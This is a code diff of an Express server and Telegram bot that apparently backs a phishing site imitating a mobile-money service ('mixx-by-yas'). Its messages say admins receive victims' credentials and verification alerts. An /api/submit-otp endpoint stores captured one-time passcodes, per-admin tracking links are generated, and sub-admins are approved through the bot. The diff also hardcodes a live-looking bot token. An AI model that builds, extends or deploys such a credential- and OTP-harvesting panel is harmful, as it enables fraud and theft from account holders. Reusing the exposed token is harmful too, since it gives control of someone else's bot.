@@ -6,10 +6,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
 const PORT = process.env.PORT || 3000;
 
-const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+// Initialize bot WITHOUT polling for webhook stability on Render
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);
 
 let activeSessions = {};
 let authorizedAdmins = new Set();
@@ -28,39 +29,67 @@ function isAuthorized(chatId) {
     return authorizedAdmins.has(chatId.toString());
 }
 
-bot.onText(/\/start/, (msg) => {
+// Webhook endpoint to receive updates directly from Telegram
+app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
+// Handle incoming bot text commands and messages
+bot.on('message', (msg) => {
+    if (!msg.text) return;
     const chatId = msg.chat.id;
     const userIdStr = chatId.toString();
+    const firstName = msg.from.first_name || 'Admin';
+    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
-    if (!MAIN_ADMIN_ID) {
-        MAIN_ADMIN_ID = userIdStr;
-        authorizedAdmins.add(userIdStr);
-        bot.sendMessage(chatId, "👑 *You are now registered as the Main Admin!*\nYour ID has been automatically saved. You have full access to receive incoming client credentials and verification alerts.", { parse_mode: "Markdown" });
-        console.log(`Main Admin automatically assigned to ID: ${userIdStr}`);
-        return;
-    }
+    const host = process.env.RENDER_EXTERNAL_URL || 'https://mixx-by-yas-m5oy.onrender.com';
+    const isolatedLink = `${host}/?admin=${userIdStr}`;
 
-    const isMain = userIdStr === MAIN_ADMIN_ID.toString();
-
-    if (isMain) {
-        authorizedAdmins.add(userIdStr);
-        bot.sendMessage(chatId, "✅ *Main Admin Dashboard Active.*\nYou have full access to receive incoming client links and verification alerts.", { parse_mode: "Markdown" });
-    } else {
-        if (authorizedAdmins.has(userIdStr)) {
-            bot.sendMessage(chatId, "✅ *Sub-Admin Dashboard Active.*\nYou are authorized and receiving client alerts.", { parse_mode: "Markdown" });
-        } else {
-            pendingMainAdminAuth.set(userIdStr, true);
-            bot.sendMessage(chatId, "🔒 *Sub-Admin Access Request Pending.*\nYour ID requires authorization from the Main Admin to receive client links.", { parse_mode: "Markdown" });
+    if (msg.text.startsWith('/start')) {
+        if (!MAIN_ADMIN_ID) {
+            MAIN_ADMIN_ID = userIdStr;
+            authorizedAdmins.add(userIdStr);
             
-            bot.sendMessage(MAIN_ADMIN_ID, `⚠️ *New Sub-Admin Request*\nUser ID: \`${chatId}\` wants access.`, {
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [[
-                        { text: "🟢 AUTHORISE", callback_data: `auth_sub_${chatId}` },
-                        { text: "🔴 DENY", callback_data: `deny_sub_${chatId}` }
-                    ]]
-                }
-            });
+            const welcomeText = `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
+                `👤 *Name:* ${escapeMarkdown(firstName)}\n` +
+                `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
+                `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
+                `🔗 *Your Isolated Application Link:*\n${isolatedLink}`;
+
+            bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" });
+            console.log(`Main Admin automatically assigned to ID: ${userIdStr}`);
+            return;
+        }
+
+        const isMain = userIdStr === MAIN_ADMIN_ID.toString();
+
+        if (isMain) {
+            authorizedAdmins.add(userIdStr);
+            const dashboardText = `🚨 *Your Dynamic Admin Link Registered!*\n\n` +
+                `👤 *Name:* ${escapeMarkdown(firstName)}\n` +
+                `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
+                `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
+                `🔗 *Your Isolated Application Link:*\n${isolatedLink}`;
+
+            bot.sendMessage(chatId, dashboardText, { parse_mode: "Markdown" });
+        } else {
+            if (authorizedAdmins.has(userIdStr)) {
+                bot.sendMessage(chatId, "✅ *Sub-Admin Dashboard Active.*\nYou are authorized and receiving client alerts.", { parse_mode: 'Markdown' });
+            } else {
+                pendingMainAdminAuth.set(userIdStr, true);
+                bot.sendMessage(chatId, "🔒 *Sub-Admin Access Request Pending.*\nYour ID requires authorization from the Main Admin to receive client links.", { parse_mode: 'Markdown' });
+                
+                bot.sendMessage(MAIN_ADMIN_ID, `⚠️ *New Sub-Admin Request*\nUser ID: \`${chatId}\` wants access.`, {
+                    parse_mode: "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [[
+                            { text: "🟢 AUTHORISE", callback_data: `auth_sub_${chatId}` },
+                            { text: "🔴 DENY", callback_data: `deny_sub_${chatId}` }
+                        ]]
+                    }
+                });
+            }
         }
     }
 });
@@ -182,7 +211,7 @@ app.post('/api/submit-otp', express.json(), (req, res) => {
     const session = activeSessions[sessionId];
 
     if (!session) {
-        return res.status(404).json({ success: false, message: 'Session not found' });
+        return res.json({ success: false, message: 'Session not found' });
     }
 
     session.otpText = otpText;
@@ -223,4 +252,3 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
